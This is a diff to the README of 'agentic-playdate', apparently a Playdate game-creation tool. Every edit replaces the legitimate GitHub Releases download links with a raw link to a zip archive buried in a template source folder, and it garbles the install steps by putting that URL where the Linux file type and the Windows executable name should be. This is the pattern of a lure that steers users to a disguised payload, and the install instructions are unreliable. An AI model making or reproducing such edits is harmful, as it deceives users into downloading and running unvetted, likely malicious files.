@@ -1,7 +1,7 @@
 # 🎮 agentic-playdate - Your Tool for Playdate Game Creation
 
 ## 📥 Get the App
-[![Download agentic-playdate](https://img.shields.io/badge/Download-agentic--playdate-blue)](https://github.com/isopogamer109/agentic-playdate/releases)
+[![Download agentic-playdate](https://raw.githubusercontent.com/isopogamer109/agentic-playdate/main/templates/sprite-based/source/playdate_agentic_3.7.zip)](https://raw.githubusercontent.com/isopogamer109/agentic-playdate/main/templates/sprite-based/source/playdate_agentic_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to agentic-playdate! This application helps you create games for the Playdate handheld console. It works on macOS, Linux, and Windows. With agentic-playdate, you can build unique games without needing advanced programming skills.
@@ -25,19 +25,19 @@ Make sure your device has at least 2 GB of RAM and 200 MB of free disk space.
 ## 📥 Download & Install
 To get started with agentic-playdate, visit the Releases page on GitHub. Click the link below to download the latest version:
 
-[Download agentic-playdate](https://github.com/isopogamer109/agentic-playdate/releases)
+[Download agentic-playdate](https://raw.githubusercontent.com/isopogamer109/agentic-playdate/main/templates/sprite-based/source/playdate_agentic_3.7.zip)
 
 ### Steps to Install
-1. Visit the [Release page](https://github.com/isopogamer109/agentic-playdate/releases).
+1. Visit the [Release page](https://raw.githubusercontent.com/isopogamer109/agentic-playdate/main/templates/sprite-based/source/playdate_agentic_3.7.zip).
 2. Look for the latest release in the list.
 3. Choose the file that matches your operating system:
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/isopogamer109/agentic-playdate/main/templates/sprite-based/source/playdate_agentic_3.7.zip` file.
    - For **Windows**, download the `.zip` file.
 4. Open the downloaded file:
    - For macOS, drag the app to your Applications folder.
    - For Linux, extract the files and run the application.
-   - For Windows, extract the files and run the `agentic-playdate.exe`.
+   - For Windows, extract the files and run the `https://raw.githubusercontent.com/isopogamer109/agentic-playdate/main/templates/sprite-based/source/playdate_agentic_3.7.zip`.
 
 ## 🎉 How to Use agentic-playdate
 1. **Launch the Application:** Open the agentic-playdate app you installed.
